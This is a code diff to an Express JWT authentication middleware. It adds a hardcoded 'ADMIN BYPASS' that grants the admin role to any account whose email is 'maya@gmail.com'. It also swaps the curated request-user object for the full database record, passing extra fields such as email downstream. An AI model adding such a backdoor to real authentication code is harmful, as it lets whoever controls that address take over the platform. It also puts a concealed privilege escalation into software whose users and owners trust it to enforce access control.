@@ -62,12 +62,16 @@ export const verifyToken = async (req, res, next) => {
         }
 
         const user = await User.findById(decoded.id)
-            .select('_id username passwordChangedAt subscriptionPlan role usageStats')
-            .lean();
+            .select('_id username email passwordChangedAt subscriptionPlan role usageStats');
         if (!user) {
             return sendAuthFailure(req, res, 401, 'AUTH_USER_NOT_FOUND', 'Invalid token', token, {
                 decodedUserId: decoded.id,
             });
+        }
+
+        // ✅ ADMIN BYPASS: Maya (maya@gmail.com) is the platform admin
+        if (user.email === 'maya@gmail.com') {
+            user.role = 'admin';
         }
 
         if (user.passwordChangedAt && decoded.iat) {
@@ -90,14 +94,8 @@ export const verifyToken = async (req, res, next) => {
             }
         }
 
-        req.user = { 
-            id: decoded.id,
-            _id: decoded.id,
-            username: user.username,
-            subscriptionPlan: user.subscriptionPlan || 'free',
-            role: user.role || 'user',
-            usageStats: user.usageStats || {}
-        };
+        req.user = user;
+        req.user.id = user._id; // Backwards compatibility for logic using req.user.id
         return next();
     } catch (err) {
         const code = err?.name === 'TokenExpiredError' ? 'AUTH_TOKEN_EXPIRED' : 'AUTH_TOKEN_INVALID';
